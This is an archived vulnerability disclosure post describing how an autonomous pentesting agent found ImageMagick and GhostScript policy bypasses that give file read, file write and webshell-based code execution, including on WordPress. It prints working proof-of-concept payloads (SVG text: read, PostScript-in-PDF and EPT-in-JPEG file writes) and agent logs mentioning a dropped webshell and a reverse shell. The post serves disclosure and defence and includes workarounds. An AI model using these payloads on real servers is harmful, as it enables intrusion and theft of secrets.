---
type: Article
title: "ImageMagick: From Arbitrary File Read to RCE In Every Policy"
description: Builds ImageMagick file-read, file-write and conditional command-execution chains from content detection, coder aliases and delegate-policy gaps. The work tests default, limited and secure policy profiles and shows how parser and policy interpretation differences preserve dangerous paths.
resource: "https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday"
tags: [article, webseclist-reference, en, pwn-ai, imagemagick, parser-differential, policy-bypass, file-read, file-write, rce]
generated:
  by: webseclist-refs/1
  at: "2026-10-02T04:06:10+00:00"
status: stable
stale_after: 2027-10-02
sources:
  - id: original
    resource: "https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday"
    title: "ImageMagick: From Arbitrary File Read to RCE In Every Policy"
    author: PWNAI Research
    last_modified: 2026-03-30
also_at: []
authors:
  - PWNAI Research
canonical_url: ""
cited_by:
  - "2026-ai.md:86"
commit: ""
content_sha256: 3baf7c3fdd974b3d647848bbfe226c07fd9b60eee7893692b51c9deab550aa4e
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday"
published: 2026-03-30
publisher: PWN.AI
publisher_english: ""
raw_sha256: 3c1324414d8907592c646cd3cbc47ba4c8be5b9496d443c1618eda28fdb1895a
retrieved_from: "https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday"
retrieved_kind: live
retrieved_utc: "2026-10-02T04:06:10+00:00"
slug: 2026-pwn-ai-imagemagick-arbitrary-file-read-rce-every-policy
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# ImageMagick: From Arbitrary File Read to RCE In Every Policy

**ImageMagick: From Arbitrary File Read to RCE In Every Policy** - PWNAI Research, PWN.AI.

- Published: 2026-03-30
- Original: <https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday>
- Preserved from: https://pwn.ai/blog/imagemagick-from-arbitrary-file-read-to-rce-in-every-policy-zeroday (live) on 2026-10-02
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so
it remains readable if the page goes offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

When the relentless [pwn.ai](https://pwn.ai) encounters a target with nothing interesting except an upload box, most seasoned pentesters test the known attack classes and move on. pwn doesn't. We taught it not to. You may know Octagon Networks' research from many bugs, for example, a bug where, when the PHP pattern is too secure, instead of giving up, we reversed the PHP function, fuzzed the method, and found a zero-day in the underlying language, which we wrote about [here](https://pwn.ai/blog/cve-2021-45467-cwp-centos-web-panel-preauth-rce). As pwn's teachers, and as seasoned hackers, we wanted to teach it our ways, and how real, determined attackers research. For this reason, pwn knows it's a matter of time until it breaks in, even if all there is is an empty upload box.

In this case, pwn ended up discovering multiple file write and file read issues affecting millions of servers by default by targeting ImageMagick, across multiple configurations: file leaks, remote code execution, and security policy bypasses. The pentesting capabilities of pwn are, frankly, quite scary. It is clearly up to par with world class hackers. The level of depth and breadth we get to cover in a matter of days is absolutely incredible and is not typical of any other pentest.

This is the story of how pwn.ai spent nearly five days autonomously researching ImageMagick internals in an attempt to break into a customer site: probing every coder, delegate, protocol handler, and format detection mechanism to chain together a series of vulnerabilities that achieve highest impact imaginable through a single image upload. On the default configuration. On the recommended "production-safe" configuration. On the maintainer's own suggested mitigation. And on their most restrictive "secure" configuration.

What started as a single client engagement turned into the discovery of multiple zero-day vulnerabilities affecting every major Linux distribution, WordPress installations worldwide, and the entire ImageMagick security policy architecture. We'll let you enjoy the following heavily redacted almost a week long trace and zerodays ;)

## The Target

The client was running a web application with a minimal attack surface. No APIs or interesting fields, it is used to process invoices and there is no client-side JavaScript of interest. The most interesting functionality appears to be an upload box.

Uploaded files were processed by ImageMagick; the ubiquitous image processing library installed on millions of servers. The system was up to date running Ubuntu 22.04 (#1 server setup right now). No known CVEs applied. No obvious misconfiguration.

pwn.ai identified ImageMagick as the primary attack vector. Given there was nothing else on the application, the agent did something unusual: it downloaded ImageMagick into its own sandboxed environment and began a multi-day, systematic audit of the entire processing pipeline.

## The Research

```
[00:42:02] new objective : achieve zeroday RCE through ImageMagick file upload

```

pwn.ai thought → *The target processes uploaded images with `convert`. The attack surface is whatever ImageMagick does with attacker-controlled file content. I need to understand format detection, coder selection, delegate invocation, and policy enforcement as there are no known CVEs for this version.*

### Day 1 — Format Detection Bypass

The agent's first discovery was fundamental: ImageMagick doesn't trust file extensions.

```
[04:12:33] action  : test format detection across extensions
[04:12:41] obs     : file named photo.jpg containing <?xml at byte 0
                     → IM detects as SVG, ignores .jpg extension
[04:13:02] confirm : tested across 13 extensions (.jpg .png .gif .mov .mp4 .docx ...)
                     ALL detected as SVG when content starts with <?xml
[04:13:15] finding : extension-based upload filtering is completely bypassed
                     by content-based magic byte detection

```

pwn.ai thought → *This is an interesting behavior. Any upload filter that checks file extensions is irrelevant. I can deliver SVG payloads disguised as any file type. Now I need to find what SVG processing can reach.*

### Day 1-2 — Mapping the MSVG Renderer Attack Surface

```
[08:44:12] action  : audit SVG <image xlink:href="..."> handler
[08:44:30] obs     : MSVG renderer passes href values through ReadImage()
                     which supports IM's internal coder prefix syntax
[08:45:01] test    : <image xlink:href="text:/etc/passwd"/>
[08:45:03] result  : /etc/passwd content rendered as text in output image
[08:45:07] finding : ARBITRARY FILE READ — any file readable by the IM process
                     is rendered into the output image via text: coder

```

pwn.ai thought → *File read confirmed. The output image that gets returned to the user contains the target file's content rendered as visible text. This is already critical vulnerability in my customer's server. AWS credentials in /proc/self/environ, SSH keys, .env files, application secrets. But I need to focus on more impactful escalations.*

```
[12:31:44] action  : enumerate PostScript-related coders
[12:31:52] obs     : Ubuntu 22.04 default policy blocks: PS, PS2, PS3, EPS, PDF, XPS
[12:32:08] obs     : policy does NOT block: EPSI, EPI, EPSF
[12:32:15] test    : <image xlink:href="EPSI:payload.jpg"/>
[12:32:18] result  : IsCoderAuthorized("EPSI") → ALLOWED
                     GhostScript invoked on payload.jpg
[12:32:22] finding : EPSI coder bypasses Ubuntu's PS/EPS blocklist
                     while invoking the same GhostScript delegate

```

pwn.ai thought → *The default Ubuntu seems to have blocked PS and EPS but forgot EPSI and EPSF. all of which invoke the same GhostScript binary. Now I need a PostScript payload that GhostScript will execute but that ImageMagick won't detect as PostScript (since PS is blocked).*

### Day 2-3 — The Magic Byte Shift

```
[18:05:33] action  : analyzing IM's PostScript detection mechanism
[18:05:41] obs     : IM checks for %!PS at exact byte offset 0
[18:06:02] test    : payload starting with \n (0x0a) then %!PS
[18:06:05] result  : IM reports "unknown format" — PS detection fails
                     but GhostScript 9.55.0 tolerates leading \n
                     and executes the PostScript normally
[18:06:12] finding : single-byte prefix bypasses IM format detection
                     while preserving GhostScript execution

```

```
[18:22:47] action  : audit GhostScript 9.55.0 -dSAFER capabilities
[18:23:01] test    : %pipe%cmd → /invalidfileaccess (blocked)
[18:23:05] test    : (filename) (w) file def → ALLOWED
[18:23:08] test    : writestring, closefile → ALLOWED
[18:23:12] finding : GS 9.55.0 SAFER blocks shell execution
                     but allows arbitrary file write via PS file I/O

```

pwn.ai thought → *I have all the pieces. SVG magic bytes bypass extension filters. EPSI bypasses the PS policy. Leading \n bypasses PS detection. GhostScript writes arbitrary files. The chain is complete.*

### Day 3 — First Chain: SVG → EPSI → GhostScript

```
[22:15:00] chain   : COMPLETE
           step 1  : upload exploit.jpg (SVG content with <?xml magic)
           step 2  : upload payload.jpg (\n-prefixed PostScript)
           step 3  : server runs: convert exploit.jpg output.png
           step 4  : SVG renderer → EPSI:payload.jpg → GhostScript → file write
           result  : arbitrary file written to server filesystem
[22:15:33] confirm : webshell dropped, reverse shell established

```

---

## Disclosure — And The Pushback

We reported the full chain to the ImageMagick maintainers immediately. Their response:

> *"The security policies we provide are intended as baseline templates. We strongly encourage users to tailor their ImageMagick policy to match their own security requirements."*

They recommended applying a module-level restriction:

```xml
<policy domain="module" rights="none" pattern="{LABEL,MSL,MVG,PS,SVG,TEXT,URL,XPS}"/>

```

We found this response quite odd since this means ImageMagick by default on Ubuntu and many linux distros (and applications) had this file write with any file extension. We did a quick scan of more servers and found they also were vulnearble to file read. this means by on default install there is an acceptable risk of .jpg or .png file leading to file write but atleast it can be hardend by a policy. In this case, switching to "limited" policy, which is the production recommended policy is what we were realizing.

## Our Client's Reality

We realized our client was running ImageMagick completely out of the box: the default open policy. We checked other environments. The same default open policy ships on every major Linux distribution:

- **Ubuntu 22.04** (the #1 server OS)
- **Debian 11/12**
- **Fedora / RHEL / CentOS**
- **Arch Linux / Alpine Linux / openSUSE**
- **Amazon Linux**
- **Google Cloud Shell**
- **macOS Homebrew**
- **Most Docker images**

Every single one was vulnerable. The chain worked everywhere GhostScript was installed alongside ImageMagick, which is the default on most distributions.

Following the maintainers' advice, we moved our client to the **limited** policy: ImageMagick's recommended configuration for production environments that process untrusted images. In their own words:

> *"The primary objective of the limited security policy is to find a middle ground between convenience and security. This policy involves the deactivation of potentially hazardous functionalities, like specific coders such as SVG or HTTP. Furthermore, it establishes several constraints on the utilization of resources like memory, storage, and processing duration, all of which are adjustable. This policy proves advantageous in situations where there's a need to mitigate the potential threat of handling possibly malicious or demanding images, all while retaining essential capabilities for prevalent image formats."*

We applied the limited policy. SVG was blocked. PS was blocked. TEXT was blocked. We assumed the attack surface was closed.

we released pwn.ai again, with information we had fixed it. It still didn't give up.

## Breaking the Limited Policy

### Finding #2 — The PDF Bypass

```
[Day 4, 02:14:18] action  : enumerate modules NOT in limited policy blocklist
[Day 4, 02:14:25] obs     : blocked: {MSL,MVG,PS,SVG,TEXT,URL,XPS}
                             NOT blocked: PDF
[Day 4, 02:14:31] insight : PDF processing invokes the SAME GhostScript delegate as PS
                             same gs binary, same -dSAFER flag, same file write capability

```

pwn.ai thought → *The limited policy blocks the PS module but not the PDF module. Both invoke GhostScript through the same delegate. If I can route my PostScript payload through the PDF code path...*

```
[Day 4, 02:15:44] action  : create PostScript payload with .pdf extension
[Day 4, 02:15:51] test    : \n%!PS payload saved as evil.pdf
                             IM routes to PDF module (not in blocklist)
                             PDF module invokes GhostScript delegate
                             GhostScript executes PostScript
                             file written
[Day 4, 02:15:58] result  : FILE WRITE ON LIMITED POLICY

[Day 4, 02:16:12] confirm : also tested on the maintainer's recommended fix
                             pattern="{LABEL,MSL,MVG,PS,SVG,TEXT,URL,XPS}"
                             PDF still not in the list
                             FILE WRITE ON LIMITED POLICY

```

The limited policy — the one recommended for production — blocks PS but forgets PDF. Both invoke GhostScript. A single `.pdf` file achieves RCE.

### Finding #3 — The EPT Image Bypass

Our client restricted uploads to image files only: `.jpg`, `.png`, `.gif`. No more `.pdf` - even though its a common extension. The limited policy was active.

```
[Day 5, 00:13:27] action  : research image formats that invoke GhostScript
[Day 5, 09:34:02] obs     : EPT = Encapsulated PostScript with TIFF preview
                             registered as its own module "EPT" (not "PS")
                             NOT in limited policy blocklist
                             auto-detected by magic bytes C5 D0 D3 C6
                             magic detection OVERRIDES file extension
[Day 5, 09:41:30] result  : FILE WRITE/ RCE FROM A .JPG FILE ON LIMITED POLICY

```

**A single `.jpg` file. The limited policy active. Image-only upload restriction. Arb File Write.**

The magic bytes `C5 D0 D3 C6` at offset 0 override ImageMagick's extension-based format selection. The file is detected as EPT regardless of extension.

## Breaking the Secure Policy

After discovering the limited policy bypasses, we escalated to the **secure** policy : the most restrictive production-viable configuration. The secure policy adds a critical defense: blocking ALL delegates.

```xml
<policy domain="delegate" rights="none" pattern="*"/>

```

On Ubuntu 22.04 (where GhostScript runs as an external `gs` binary), this works — the delegate block catches the external process invocation.

But then we tested on default Amazon Linux.

```
[Day 5, 14:22:05] action  : test PDF bypass on Amazon Linux with secure policy
[Day 5, 14:22:11] obs     : Amazon Linux IM 6.9.13-40 compiled with --with-gslib
                             GhostScript is a LINKED LIBRARY, not an external binary
                             convert --version shows: Delegates (built-in): ... gslib ...
[Day 5, 14:22:21] result  : FILE WRITE ON SECURE POLICY CONFIRMED

```

pwn.ai thought → *The delegate policy only blocks external process calls via `ExternalDelegateCommand()`. When GhostScript is compiled into ImageMagick as a library (`gslib`), it runs in-process via `gsapi_init_with_args()`. The delegate policy check never fires. The "secure" policy's primary defense mechanism is completely non-functional.*

**Oh No This implies we now have zeroday file write and file read in default distros, in open policy, limited policy and now Secure policy**

## Additional to File Read and Write, what other risks does /tmp write have?

The /tmp/ primitive is nasty as it can be chained if you are in shared hosting for RCE, it also is allowed to follow symlinks out of /tmp, useful for file inclusion and also opens other /tmp/ → execution path like the following

-

RAM exhaustion DoS — /tmp/ is tmpfs (RAM) on Linux. A single PDF or JPG can write 1TB to RAM in under 1 second. 7.8GB tmpfs = a few uploads , which crashes the server via OOM killer.

-

PHP session poisoning — many dont know this but session files are stored in /tmp. We injected role|s:0:"admin" into a session file and became admin in a popular app we all know.

-

App state corruption, poisoning — most apps rely on files from /tmp (store in RAM for quicker use). by overwriting lock files, actively downloading files, PID files or system files, any predictable /tmp/ path lead to RCE or serious OS corruption. Emptied a .lock file can also lead to other apps malfunctioning. Almost every linux app stores temp files to access for quick RAM use, replacing these files often can lead to RCE depending on what the underlying application or operating system targeted.

## From File Write to Remote Code Execution (RCE)

pwn initially assumed these findings maximum chain was "arbitrary file write" because GhostScript's fairly lax sandbox. ImageMagick's MSL (Magick Scripting Language) coder can read and write files to **any path on disk**. MSL is processed entirely by ImageMagick's own code, GhostScript's `-dSAFER` sandbox does not apply to it. On default ImageMagick installations, the MSL coder is unrestricted.

The chain:

-

**GhostScript writes two files to `/tmp/`** (allowed by -dSAFER):

- A PHP/JPEG polyglot: a valid JPEG image with `<?php system(...) ?>` embedded in its COM marker
- An MSL payload file instructing ImageMagick to copy the polyglot to the web root

-

**ImageMagick processes the MSL file**, which reads the polyglot from `/tmp/` and writes it to an arbitrary path , such as `/var/www/html/uploads/shell.php`

-

**The PHP code in the JPEG comment survives** ImageMagick's re-encoding. When Apache serves the `.php` file, PHP finds and executes the `<?php` tag embedded in the JPEG binary data.

We confirmed this produces a working webshell returning `uid=33(www-data)` on the official `wordpress:latest` Docker
 image (ImageMagick 7.1.1-43, GhostScript 10.05.1) and on Ubuntu 22.04 (ImageMagick 6.9.11-60, GhostScript 9.55.0). GhostScript provides the `/tmp/` write primitive. ImageMagick's own MSL coder escapes the sandbox. The two components' security boundaries do not account for each other.

## Real-World Impact: WordPress

ImageMagick doesn't exist in a vacuum. It's the image processing engine behind the world's most popular web platform, among many many other services from WooCommerce to Discourse.

**WordPress uses ImageMagick (via PHP Imagick extension) by default** for thumbnail generation, image resizing, and PDF preview rendering. WordPress sets **zero** ImageMagick security policy. it relies entirely on whatever `policy.xml` the server ships, which means you are likely vulnerable by default Wordpress installation.

### WordPress + Gravity Forms = Pre-Auth File Write

Gravity Forms (2M+ active installations) allows unauthenticated visitors to submit forms with Post Image fields. The upload goes directly through WordPress's `wp_generate_attachment_metadata()` pipeline — the same code path that triggers Imagick processing.

An unauthenticated visitor submits our EPT `.jpg` through a public Gravity Form → WordPress stores the file → EPT detected → GhostScript fires → PostScript writes arbitrary file → full /tmp write. The payload required for this is very complex and will not shared in this article.

### WordPress + Author Role = Post-Auth File Write

We confirmed this on a real **WordPress 6.9.4** installation. An Author-level user (the minimum role that can upload files) achieves file write with a single upload call. PoC wont be avaibile in this post.

### The Ubuntu Problem

Ubuntu 22.04 LTS is the #1 server operating system. It ships ImageMagick 6.9.11-60 and GhostScript 9.55.0. This specific combination is one of the worst setups one can have:

- **IM 6.9.11-60** has EPT zeroday we highlighted bypassing the PS module block
- **GS 9.55.0** allows file writes to `/tmp/` under `-dSAFER`
- The EPT bypass was silently fixed in IM 6.9.13-34 (November 2025) but **never assigned a CVE** and will **not be backported to Ubuntu 22.04**

Ubuntu 22.04 will be supported until 2027. Every default WordPress + ImageMagick installation on Ubuntu 22.04 is vulnerable for the EPT right now.

---

## Complete Findings Summary

| # | Finding | Severity | Attack Vector | File | Policy Bypassed |  |
| 1 | Arbitrary file read via `text:` coder | High | SVG with `text:/etc/passwd` in `.jpg` | Single `.jpg` | Open |  |
| 2 | Arbitrary file read via `label:@` coder | High | SVG with `label:@/etc/passwd` in `.jpg` | Single `.jpg` | Open (MacOS Only) |  |
| 3 | SVG magic bytes bypass extension filtering | Medium | `<?xml` at offset 0 → SVG regardless of extension | Any extension | All (by design) |  |
| 4 | EPSI/EPI/EPSF not in Ubuntu coder blocklist | Critical | SVG referencing `EPSI:payload.jpg` → GhostScript | Two `.jpg` files | Open, Ubuntu default |  |
| 5 | `\n` prefix bypasses PS format detection | High | `0x0a` at offset 0 → IM can't detect as PS, GS still executes | Any PS payload | All (detection bypass) |  |
| 6 | **PDF module not in any policy blocklist** | **Critical** | `\n%!PS` payload in `.pdf` → PDF module → GhostScript → file write | **Single `.pdf`** | **Open, Limited, Secure (gslib), Maintainer fix** |  |
| 7 | **EPT magic bytes bypass in `.jpg`** | **Critical** | `C5 D0 D3 C6` magic → EPT detected, `.jpg` ignored → GhostScript | **Single `.jpg`** | **Open, Limited, Maintainer fix** (on IM ≤ 6.9.13-33) |  |
| 8 | **gslib bypasses delegate policy** | **Critical** | `gsapi_init_with_args()` never checks `DelegatePolicyDomain` | `.pdf` payload | **Secure** (on gslib-compiled systems) |  |
| 9 | WordPress XML-RPC skips content validation | High | `mw_newMediaObject` only checks extension, not `finfo_file()` | EPT `.jpg` via XML-RPC | WordPress Author File Write |  |
| 10 | WordPress + Gravity Forms pre-auth upload | Critical | Post Image field → `wp_generate_attachment_metadata()` → Imagick | EPT `.jpg` via form | WordPress pre-auth file write |  |

## Policy Bypass Matrix

### Ubuntu 22.04 (IM 6.9.11-60, external `gs`, GS 9.55.0)

| Policy | File Read | File Write via `.pdf` | File Write via `.jpg` (EPT) |  |
| **open** (default) | **✓** | **✓** | **✓** |  |
| **limited** (recommended) | ✗ | **✓** | **✓** |  |
| **maintainer fix** | ✗ | **✓** | **✓** |  |
| **secure** | ✗ | ✗ | ✗ |  |

### Amazon Linux / RHEL / Fedora (IM 6.9.13, `gslib` built-in)

| Policy | File Read | File Write via `.pdf` | File Write via `.jpg` (EPT) |  |
| **open** (default) | **✓** | **✓** | **✓** |  |
| **limited** (recommended) | ✗ | **✓** | ✗ (fixed in 6.9.13-34) |  |
| **secure** | ✗ | **✓ (gslib bypass!)** | ✗ |  |

---

## Proof of Concept

### File Read:

Works on Ubuntu 22.04 (Latest with latest ImageMagick by default)

```bash
printf '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="500"><image xlink:href="text:/etc/passwd" x="0" y="0" width="500" height="500"/></svg>' > read.jpg
convert read.jpg output.png

```

### File Write via PDF (works on open + limited + secure with gslib)

```bash
printf '\n%%!PS-Adobe-3.0 EPSF-3.0\n%%%%BoundingBox: 0 0 100 100\n/f (/tmp/PWNED) (w) file def\nf (HI) writestring\nf closefile\nshowpage\n' > evil.pdf
convert evil.pdf out.png
cat /tmp/PWNED

```

### File Write via EPT `.jpg` (works on open + limited — Ubuntu 22.04)

```bash
printf '\xc5\xd0\xd3\xc6\x1e\x00\x00\x00\x7a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x0a\x25\x21\x50\x53\x2d\x41\x64\x6f\x62\x65\x2d\x33\x2e\x30\x20\x45\x50\x53\x46\x2d\x33\x2e\x30\x0a\x25\x25\x42\x6f\x75\x6e\x64\x69\x6e\x67\x42\x6f\x78\x3a\x20\x30\x20\x30\x20\x31\x30\x30\x20\x31\x30\x30\x0a\x2f\x66\x20\x28\x2f\x74\x6d\x70\x2f\x50\x57\x4e\x45\x44\x29\x20\x28\x77\x29\x20\x66\x69\x6c\x65\x20\x64\x65\x66\x0a\x66\x20\x28\x52\x43\x45\x29\x20\x77\x72\x69\x74\x65\x73\x74\x72\x69\x6e\x67\x0a\x66\x20\x63\x6c\x6f\x73\x65\x66\x69\x6c\x65\x0a\x73\x68\x6f\x77\x70\x61\x67\x65\x0a' > evil.jpg
convert evil.jpg out.png
cat /tmp/PWNED

```

### Confirmed On

- **Ubuntu 22.04 LTS** — IM 6.9.11-60, GS 9.55.0 — EPT + PDF bypass possible
- **Amazon Linux 2023** — IM 6.9.13-40, GS 9.56.1 (gslib) — PDF secure policy bypass possible
- **Google Cloud Shell** — GS 9.54.0 — File Write possible
- **Debian 11/12** — same IM as Ubuntu — File Write possible
- **WordPress 6.9.4** — Author-level File Write via XML-RPC confirmed ✓
- **WordPress + Gravity Forms** — pre-auth File Write via Post Image field confirmed ✓

## The Unintended EPT Silent Fix , That Wasn't

The EPT module mapping issue was silently fixed in ImageMagick 6.9.13-34 (commit `1d452bb` by Dirk Lemstra). The commit message reads: *"Disabling a module will now also disable all the coders in that module."*

This fix was:

- **NOT assigned a CVE**
- **NOT announced as a security fix**
- **NOT backported to Ubuntu 22.04** (which ships IM 6.9.11-60)

Ubuntu 22.04 LTS has mainstream support until 2027. **Every server running default Ubuntu 22.04 with ImageMagick installed is vulnerable to the EPT bypass TODAY**, and will remain so unless Ubuntu backports the fix or users manually upgrade ImageMagick outside the package manager.

The PDF bypass and the gslib delegate bypass were **never fixed** and affect all versions including the latest.

## How Are pwn.ai Clients Protected?

This research began as a routine penetration test for a pwn.ai client. Within five days, our autonomous agent:

- **Identified a reliable attack surface** — ImageMagick as the sole processing engine
- **Discovered the file read vulnerability** — arbitrary file content rendered into output images
- **Escalated to File Write/RCE possible** — chaining format detection bypass, policy gaps, and GhostScript file writes
- **Bypassed every mitigation** — open policy, limited policy, maintainer's fix, secure policy
- **Mapped the blast radius** — all major Linux distributions, WordPress, Gravity Forms

Our client was patched within hours of the initial discovery. Their ImageMagick policy was updated to block PDF, EPT, and all GhostScript-invoking modules. Their WordPress installation was hardened with coder-level whitelisting.

**Every pwn.ai client benefits from findings like this.** When our agent discovers a vulnerability class or a widespread application, the test is rolled out across our entire client base, not just to client where it was found as pwn grows its knowledge base. Our clients were protected against these ImageMagick bypasses before this blog post was published.

This is what a deep, autonomous pentest looks like. Not a scanner checking for known CVEs. Not a human spending days clicking through an app. An agent that understands the attack surface, relentlessly uses the knowledge and mindset of its teachers to find the narrow target surface: download the target software, read the source code, builds its own test environment, and systematically dismantles every security layer until target has been compromised, running for days without stopping, following every dead end, and refusing to give up.

## Workarounds

If you're running ImageMagick on untrusted input, you are almost certainly vulnerable. Here's what to do:

### If You Need PDF Support

You cannot safely process PDFs through ImageMagick when GhostScript is installed. Options:

- **Remove GhostScript:** `apt remove ghostscript` : impactful but eliminates the execution engine and mitigates a lot of the GS chains here.
- **Process PDFs in an isolated sandbox** with no network access and a read-only filesystem

### For WordPress

- WordPress sets **no** ImageMagick policy: you must configure the server's `policy.xml` to not allow any uploads.
- The WordPress XML-RPC upload path skips content validation so disable XML-RPC if not needed (`add_filter('xmlrpc_enabled', '__return_false');`)
- If using Gravity Forms with Post Image fields, ensure the server's ImageMagick policy blocks GhostScript

### Check If You're Vulnerable

```bash

convert --version | grep gslib

cat /etc/ImageMagick-6/policy.xml | grep -v "<!--" | grep pattern

printf '\n%%!PS-Adobe-3.0 EPSF-3.0\n%%%%BoundingBox: 0 0 100 100\n/f (/tmp/IM_VULN_TEST) (w) file def\nf (VULNERABLE) writestring\nf closefile\nshowpage\n' > /tmp/test.pdf
convert /tmp/test.pdf /tmp/test_out.png 2>/dev/null
cat /tmp/IM_VULN_TEST 2>/dev/null && echo "VULNERABLE" || echo "Not vulnerable"
rm -f /tmp/IM_VULN_TEST /tmp/test.pdf /tmp/test_out.png

```

## Timeline

- **Day 0**: pwn.ai identifies ImageMagick as the sole attack surface on client application
- **Day 1-3**: Autonomous research into ImageMagick internals — format detection, coder enumeration, delegate analysis, policy gap mapping
- **Day 3**: First chain discovered (SVG → EPSI → GhostScript) on default open policy
- **Day 3**: Reported to ImageMagick maintainers
- **Day 3**: Maintainers blame default policy.
- **Day 4**: Client switches to limited policy
- **Day 4**: pwn.ai discovers PDF bypass on limited policy - old impact restored
- **Day 4**: Client switches to only allow .jpg extensions in limited policy.
- **Day 4**: pwn.ai discovers EPT magic byte bypass — vuln from `.jpg` on limited policy on default Ubuntu
- **Day 4**: Maintainer's own recommended fix tested bypassed
- **Day 6**: Testing on Amazon Linux reveals gslib delegate bypass — secure policy bypass
- **Day 6**: WordPress 6.9.4 Author-level vuln confirmed via XML-RPC
- **Day 7**: WordPress + Gravity Forms pre-auth vuln confirmed
- **Day 7**: Confirmed across all major Linux distributions and Google Cloud Shell

---

## Conclusion

A single uploaded file `.pdf` or `.jpg` achieves Remote Code Execution on default installations across every major Linux distribution, through the default policy, through the recommended production grade "limited" policy, and on most linux systems through the most restrictive "secure" policy and affects thosands of downstream services, including Wordpress Core.

pwn.ai found this by doing what autonomous agents do best: relentless, systematic exploration of a complex attack surface over days of continuous research: testing every hypothesis, following every dead end, escalating through every policy layer, and refusing to stop until every defense was broken.

---

**Note on zeroday disclosure:** We’re aware the security ecosystem is being flooded with low-quality AI-generated reports. We understand maintainers are overwhelmed and have to filter noise aggressively, but we ask that serious, well-substantiated reports be evaluated on their technical merits rather than dismissed by association with ai. Because of the confusion and breakdown in the reporting process, and because some of the zero-days and risks described here continue to affect ImageMagick deployments and downstream applications that rely on it, such as Wordpress, we are publishing these findings publicly.

*[pwn.ai](https://pwn.ai) is an autonomous penetration testing engine that finds what scanners and most professionals miss. For deep security assessments that go beyond known CVEs, visit [pwn.ai](https://pwn.ai). and order your Pentest report*
